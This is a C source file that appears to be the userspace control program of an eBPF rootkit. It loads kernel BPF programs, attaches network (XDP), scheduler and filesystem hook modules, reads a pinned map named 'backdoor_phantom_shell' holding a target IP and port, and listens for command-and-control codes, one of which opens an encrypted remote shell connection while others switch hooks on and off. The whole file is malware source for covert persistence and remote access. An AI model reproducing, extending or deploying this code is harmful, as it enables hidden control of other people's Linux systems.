#include <argp.h>
#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <linux/if_link.h>
#include <net/if.h>
#include <unistd.h>
#include <locale.h>

#include <bpf/bpf.h>

#include "kit.skel.h"

#include "../common/constants.h"
#include "../common/map_common.h"
#include "../common/c&c.h"
#include "include/utils/files/path.h"
#include "include/utils/strings/regex.h"
#include "include/utils/structures/fdlist.h"
#include "include/modules/module_manager.h"
#include "include/utils/network/ssl_client.h"

#define ABORT_IF_ERR(err, msg)\
	if(err<0){\
		fprintf(stderr, msg);\
		goto cleanup\
	}

static struct env {
	bool verbose;
} env;

void print_help_dialog(const char* arg){
	
    printf("\nUsage: %s ./kit OPTION\n\n", arg);
    printf("Program OPTIONs\n");
    char* line = "-t[NETWORK INTERFACE]";
    char* desc = "Activate XDP filter";
    printf("\t%-40s %-50s\n\n", line, desc);
	line = "-v";
    desc = "Verbose mode";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-h";
    desc = "Print this help";
    printf("\t%-40s %-50s\n\n", line, desc);

}

/*Wrapper for printing into stderr when debug active*/
static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args){
	if (level == LIBBPF_DEBUG && !env.verbose)
		return 0;
	return vfprintf(stderr, format, args);
}

/**
* Increases kernel internal memory limit
* necessary to allocate resouces like BPF maps.
*/
static void bump_memlock_rlimit(void){
	struct rlimit rlim_new = {
		.rlim_cur	= RLIM_INFINITY,
		.rlim_max	= RLIM_INFINITY,
	};

	if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) {
		fprintf(stderr, "Failed to increase RLIMIT_MEMLOCK limit!\n");
		exit(1);
	}
}

static volatile bool exiting = false;

static void sig_handler(int sig){
	exiting = true;
}

/**
 * @brief Manages an event received via the ring buffer
 * It's a message from th ebpf program
 * 
 * @param ctx 
 * @param data 
 * @param data_sz 
 * @return int 
 */
static int handle_rb_event(void *ctx, void *data, size_t data_size){
	const struct rb_event *e = data;

	//For time displaying
	struct tm *tm;
	char ts[32];
	int ret;
	time_t t;
	time(&t);
	tm = localtime(&t);
	strftime(ts, sizeof(ts), "%H:%M:%S", tm);


    if(e->event_type == INFO){
		printf("%s INFO  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
	}else if(e->event_type == DEBUG){

	}else if(e->event_type == ERROR){

	}else if(e->event_type == EXIT){

	}else if(e->event_type == COMMAND){
		printf("%s COMMAND  pid:%d code:%i\n", ts, e->pid, e->code);
		switch(e->code){
			case CC_PROT_COMMAND_ENCRYPTED_SHELL:
			//TODO EXTRACT IP FROM KERNEL BUFFER
				printf("Starting encrypted connection\n");
				client_run("127.0.1.1", 8500);
            	break;
			case CC_PROT_COMMAND_HOOK_ACTIVATE_ALL:
				printf("Activating all hooks as requested\n");
				activate_all_modules_config();
				ret = unhook_all_modules();
				if(ret<0) printf("Failed to complete command: unhook all\n");
				ret = setup_all_modules();
				if(ret<0) printf("Failed to complete command: setup modules\n");
            	break;
			case CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL:
				printf("Deactivating all hooks as requested\n");
				deactivate_all_modules_config();
				ret = unhook_all_modules();
				if(ret<0) printf("Failed to complete command: unhook all\n");
            	break;
			default:
				printf("Command received unknown: %d\n", e->code);
		}
	}else{
		printf("%s COMMAND  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
		return -1;
	}

	return 0;
}

int check_map_fd_info(int map_fd, struct bpf_map_info *info, struct bpf_map_info *exp){
	__u32 info_len = sizeof(*info);
	int err;

	if (map_fd < 0)
		return -1;

	err = bpf_obj_get_info_by_fd(map_fd, info, &info_len);
	if (err) {
		fprintf(stderr, "ERR: %s() can't get info - %s\n",
			__func__,  strerror(errno));
		return -1;
	}

	if (exp->key_size && exp->key_size != info->key_size) {
		fprintf(stderr, "ERR: %s() "
			"Map key size(%d) mismatch expected size(%d)\n",
			__func__, info->key_size, exp->key_size);
		return -1;
	}
	if (exp->value_size && exp->value_size != info->value_size) {
		fprintf(stderr, "ERR: %s() "
			"Map value size(%d) mismatch expected size(%d)\n",
			__func__, info->value_size, exp->value_size);
		return -1;
	}
	if (exp->max_entries && exp->max_entries != info->max_entries) {
		fprintf(stderr, "ERR: %s() "
			"Map max_entries(%d) mismatch expected size(%d)\n",
			__func__, info->max_entries, exp->max_entries);
		return -1;
	}
	if (exp->type && exp->type  != info->type) {
		fprintf(stderr, "ERR: %s() "
			"Map type(%d) mismatch expected type(%d)\n",
			__func__, info->type, exp->type);
		return -1;
	}

	return 0;
}

struct backdoor_phantom_shell_data{
	int active;
	__u32 d_ip;
	__u16 d_port;
};

int main(int argc, char**argv){
    struct ring_buffer *rb = NULL;
    struct kit_bpf *skel;
	struct bpf_map_info map_expect = { 0 };
	struct bpf_map_info info = { 0 };
    __u32 err;

	//Ready to be used
	/*for (int arg = 1; arg < argc; arg++) {
		if (load_fd_kmsg(argv[arg])) {
			fprintf(stderr, "%s.\n", strerror(errno));
			return EXIT_FAILURE;
		}
	}*/
	
	__u32 ifindex; 

	/* Parse command line arguments */
	int opt;
	while ((opt = getopt(argc, argv, ":t:vh")) != -1) {
        switch (opt) {
        case 't':
            ifindex = if_nametoindex(optarg);
            printf("Activating filter on network interface: %s\n", optarg);
            if(ifindex == 0){
				perror("Error on input interface");
				exit(EXIT_FAILURE);
			}
			break;
		case 'v':
			//Verbose output
			env.verbose = true;
			break;

        case 'h':
            print_help_dialog(argv[0]);
            exit(0);
            break;
        case '?':
            printf("Unknown option: %c\n", optopt);
			exit(EXIT_FAILURE);
            break;
        case ':':
            printf("Missing arguments for %c\n", optopt);
            exit(EXIT_FAILURE);
            break;
        
        default:
            print_help_dialog(argv[0]);
            exit(EXIT_FAILURE);
        }
    }
	
	//Set up libbpf errors and debug info callback
	libbpf_set_print(libbpf_print_fn);

	// Bump RLIMIT_MEMLOCK to be able to create BPF maps
	bump_memlock_rlimit();

	//Cleaner handling of Ctrl-C
	signal(SIGINT, sig_handler);
	signal(SIGTERM, sig_handler);

    //Open and create BPF application in the kernel
	skel = kit_bpf__open();
	if (!skel) {
		fprintf(stderr, "Failed to open and load BPF skeleton\n");
		return 1;
	}

	
	
	//Load & verify BPF program
	err = kit_bpf__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}

	int tc_efd = bpf_obj_get("/sys/fs/bpf/tc/globals/backdoor_phantom_shell");
	printf("TC MAP ID: %i\n", tc_efd);
	map_expect.key_size    = sizeof(__u64);
	map_expect.value_size  = sizeof(struct backdoor_phantom_shell_data);
	map_expect.max_entries = 1;
	err = check_map_fd_info(tc_efd, &info, &map_expect);
	if (err) {
		fprintf(stderr, "ERR: map via FD not compatible\n");
		return err;
	}
	printf("\nCollecting stats from BPF map\n");
	printf(" - BPF map (bpf_map_type:%d) id:%d name:%s"
			" key_size:%d value_size:%d max_entries:%d\n",
			info.type, info.id, info.name,
			info.key_size, info.value_size, info.max_entries
			);
	int key = 1;
	struct backdoor_phantom_shell_data data;
	err = bpf_map_lookup_elem(tc_efd, &key, &data);
	if(err<0) {
		printf("Failed to lookup element\n");
	}
	printf("%i, %i, %i\n", data.active, data.d_ip, data.d_port);

	/*bpf_obj_get(NULL);
	char* DIRECTORY_PIN = "/sys/fs/bpf/mymaps";
	err = bpf_object__unpin_maps(skel->obj, DIRECTORY_PIN);
	if (err) {
		fprintf(stderr, "ERR: UNpinning maps in %s\n",DIRECTORY_PIN);
		//return -1;
	}
	err = bpf_object__pin_maps(skel->obj, DIRECTORY_PIN);
	if (err) {
		fprintf(stderr, "ERR: pinning maps in %s\n",DIRECTORY_PIN);
		return -1;
	}
	bpf_map__pin(skel->maps.backdoor_phantom_shell, DIRECTORY_PIN);*/

	//Attach XDP and sched modules using module manager
	//and setup the parameters for the installation
	//XDP
	module_config.xdp_module.all = ON;
	module_config_attr.xdp_module.flags = XDP_FLAGS_REPLACE;
	module_config_attr.xdp_module.ifindex = ifindex;
	//SCHED
	module_config.sched_module.all = ON;
	//FS
	module_config.fs_module.all = ON;
	
	module_config_attr.skel = skel;
	err = setup_all_modules();

	// Set up ring buffer polling --> Main communication buffer kernel->user
	rb = ring_buffer__new(bpf_map__fd(skel->maps.rb_comm), handle_rb_event, NULL, NULL);
	if (rb==NULL) {
		err = -1;
		fprintf(stderr, "Failed to create ring buffer\n");
		goto cleanup;
	}

	//Now wait for messages from ebpf program
	printf("Filter set and ready\n");
	while (!exiting) {
		err = ring_buffer__poll(rb, 100 /* timeout, ms */);
		
		//Checking if a signal occured
		if (err == -EINTR) {
			err = 0;
			break;
		}
		if (err < 0) {
			printf("Error polling ring buffer: %d\n", err);
			break;
		}
	}

	//Received signal to stop, detach program from network interface
	/*err = detach_sched_all(skel);
	if(err<0){
		perror("ERR");
		goto cleanup;
	}
	detach_xdp_all(skel);
	if(err<0){
		perror("ERR");
		goto cleanup;
	}*/

cleanup:
	ring_buffer__free(rb);
	//kit_bpf__destroy(skel);
	if(err!=0) return -1;

    return 0;
}
